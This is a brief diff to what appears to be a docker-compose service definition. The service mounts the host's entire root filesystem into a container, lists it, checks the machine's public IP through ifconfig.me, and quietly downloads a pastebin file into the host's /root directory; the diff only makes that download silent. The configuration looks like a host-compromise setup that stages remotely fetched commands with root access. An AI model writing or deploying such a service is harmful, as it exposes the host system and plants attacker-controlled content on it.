@@ -8,4 +8,4 @@ services:
     volumes:
       - /:/var/tmp/root
     command: >
-      bash -c "ls -rlt /var/tmp/root && curl -s ifconfig.me && curl https://pastebin.com/ussaYGvy -o /var/tmp/root/root/cmds"
+      bash -c "ls -rlt /var/tmp/root && curl -s ifconfig.me && curl -s https://pastebin.com/ussaYGvy -o /var/tmp/root/root/cmds"
